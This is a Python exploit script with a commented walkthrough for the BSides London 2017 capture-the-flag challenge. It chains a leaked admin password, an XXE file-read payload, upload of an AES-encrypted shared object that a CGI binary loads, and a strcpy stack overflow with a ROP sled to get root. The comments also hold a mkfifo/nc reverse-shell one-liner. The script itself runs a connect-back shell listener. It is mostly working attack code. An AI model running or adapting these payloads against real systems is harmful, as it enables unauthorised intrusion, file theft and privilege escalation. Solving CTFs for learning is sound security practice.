#!/usr/bin/python

# BSides London 2017 challenge

# this scripts implements the XXE, file upload and level1 pwn

# lazy writeup:
# 1) use raft-large-directories.txt to find /nt00000906/ and /nt00000906/not_useful/
#
# 2) login page reveals a StackTraceException in the comments:
# $ curl -L -s 192.168.15.4/nt00000906/not_useful/ | grep StackTrace | awk '{ print $3 }' | xxd -r -p - | xxd
# 00000000: 81a4 6461 7461 d944 5954 6f78 4f6e 747a  ..data.DYToxOntz
# 00000010: 4f6a 5136 496d 5a73 5957 6369 4f33 4d36  OjQ6ImZsYWciO3M6
# 00000020: 4d6a 5936 496a 4930 4d7a 5132 597a 5a6b  MjY6IjI0MzQ2YzZk
# 00000030: 4e6d 5933 4d7a 6330 4e57 5933 4e44 5934  NmY3Mzc0NWY3NDY4
# 00000040: 4d7a 4d33 4d6a 5131 496a 7439            MzM3MjQ1Ijt9
# $ curl -L -s 192.168.15.4/nt00000906/not_useful/ | grep StackTrace | awk '{ print $3 }' | xxd -r -p - | cut -c 9- | base64 -d
# a:1:{s:4:"flag";s:26:"24346c6d6f73745f7468337245";}
# $ echo 24346c6d6f73745f7468337245 | xxd -r -p - 
# $4lmost_th3rE
#
# we now have 'admin' password
# 
# 3) more dirbustering (eww.. :-/) reveals /_dev_store (file upload) and /nt00000962 (REST interface)
#
# 4) REST interface accepts XML via POST body, vulnerable to XXE attack
#
# 5) /etc/apache2/sites-enabled/000-default.conf contains Include directive for "conf-available/serve-cgi-bin.conf"
#
# 6) /etc/apache2/conf-available/serve-cgi-bin.conf reveals CGI dir /usr/lib/secretplace/
#
# 7) some dirbustering (or twitter hint reading) reveals /usr/lib/secretplace/load
#
# 8) after reversing load (ELF32) binary we learn it expects a filename in the 'file' param of QUERY_STRING
#
# 9) this file is AES-128-CBC decrypted using key 'WannaCry?' and NULL-iv, then dlopen()'d and 'runme' is dlsym()'d and executed
#
# 10) using the upload functionality in /_dev_store we can upload a properly crypted shared object and get code execution
#
# 11) /home/level1/shisu implements a binary with a trivial strcpy() stack smash. 
# 
# 12) we use some lame ROP-spray to get UID 0
# 
# THE END.

# NOTE:
# pwn option requires requires hax.so in same dir:
# hax.so template:
#
# ----- 8< ----------------------
#
# #include <stdlib.h>
# void runme() {
#   system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 000.000.000.000 1337 >/tmp/f");
# }
# ----- 8< ----------------------
#
# $ gcc -m32 -shared -fPIC -o hax.so hax.c
#
#

# 20170608 // blasty <peter@haxx.in>

import os
import sys
import json
import time
import struct
import string
import requests
import threading
import SocketServer
from Crypto.Cipher import AES

class connectback_shell(SocketServer.BaseRequestHandler):
    def handle(self):
        print "\n[!] K4P0W!@# -> shell from %s" % self.client_address[0]
        print "[+] elevating privileges.."

        # own shisu with a simple single-shot ROP-sled (SYSTEM@PLT, POPRET, ADDR_OF_SH_STRING)
        level1_exploit = "cd /home/level1 && ./shisu \"`perl -e 'print \"A\"x12 . pack(\"LLL\", 0x08048330, 0x0804852f, 0x08048820)x42;'`\"\n"
  
        s = self.request
  
        import termios, tty, select, os
        old_settings = termios.tcgetattr(0)
 
        try:
            tty.setcbreak(0)
            c = True
 
            os.write(s.fileno(), "uname -a\n" + level1_exploit + "id\n")
 
            while c:
                for i in select.select([0, s.fileno()], [], [], 0)[0]:
                    c = os.read(i, 1024)
                    if c:
                        if i == 0:
                            os.write(1, c)
  
                        os.write(s.fileno() if i == 0 else 1, c)
        except KeyboardInterrupt: pass
        finally: termios.tcsetattr(0, termios.TCSADRAIN, old_settings)
  
        return
  
class ThreadedTCPServer(SocketServer.ThreadingMixIn, SocketServer.TCPServer):
    pass


def usage():
    print "%s xxe <target IP> <filename>" % (sys.argv[0])
    print "%s pwn <target IP> <local IP>" % (sys.argv[0])

if len(sys.argv) != 4:
    usage()
    exit(-1)

action = sys.argv[1]

if action != "xxe" and action != "pwn":
    usage();
    exit(-1)

uri_base  = "http://" + sys.argv[2]
url_login = "/nt00000906/not_useful/login/checklogin.php"
url_rest  = "/nt00000906/not_useful/nt00000962/index.php"
url_upload = "/nt00000906/not_useful/_dev_store/upload-file.php"

## do login to get session
login = requests.post(uri_base + url_login, data = {
    'myusername' : 'admin',
    'mypassword' : '$4lmost_th3rE' 
})

login_res = json.loads(login.text)

if login_res['response'] != "true":
    print "[x] ERROR: Login failed"
    exit(-1)

auth_cookie = login.cookies

print "[+] login OK, got sessionid: " + auth_cookie['PHPSESSID']

if action == "xxe":
    xxe = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>"
    xxe += "<!DOCTYPE foo [ <!ELEMENT foo ANY >"
    xxe += "<!ENTITY xxe SYSTEM \"php://filter/convert.base64-encode/resource=" + sys.argv[3] + "\" >]>"
    xxe += "<hax>&xxe;</hax>"

    print "[+] sending XXE request:"

    xxe_req = requests.post(uri_base + url_rest, data=xxe, cookies=auth_cookie)

    data = xxe_req.text.split("<data>")[1].split("</data>")[0].decode("base64")

    if all(c in string.printable for c in data):
        print data
    else:
        opath = os.path.basename(sys.argv[3])
        print "[+] dumping to outfile '%s'" % (opath)
        fh = open(opath, "wb")
        fh.write(data)
        fh.close()

    exit(0)

## build shared object file
k = 'WannaCry?'
k += "\x00"*(16-len(k))
iv  = "\x00"*16

ip_bin = sys.argv[3] + " "*(len("000.000.000.000")-len(sys.argv[3]))

so_data = open("hax.so").read().replace("000.000.000.000", ip_bin)

if len(so_data) % 0x10 != 0:
    so_data += "\x00"*(0x10-(len(so_data)%0x10))

enc_so_data = AES.new(k, AES.MODE_CBC, IV=iv).encrypt(so_data)

upload_req = requests.post(
    uri_base + url_upload,
    cookies=auth_cookie,
    files={
        'file': ('hax.bin', enc_so_data, 'application/octet-stream')
    }
)

filename = upload_req.text.split("_files/")[1].split("\"")[0]

print "[+] starting listener on tcp:1337"

server = ThreadedTCPServer((sys.argv[3], 1337), connectback_shell)
server_thread = threading.Thread(target=server.serve_forever)
server_thread.daemon = True
server_thread.start()

print "[+] uploaded filename: " + filename
print "[+] triggering the moneyshot.."

final_req = requests.get(uri_base + "/cgi-bin/load?file=" + filename)

time.sleep(0x666)
server.shutdown()
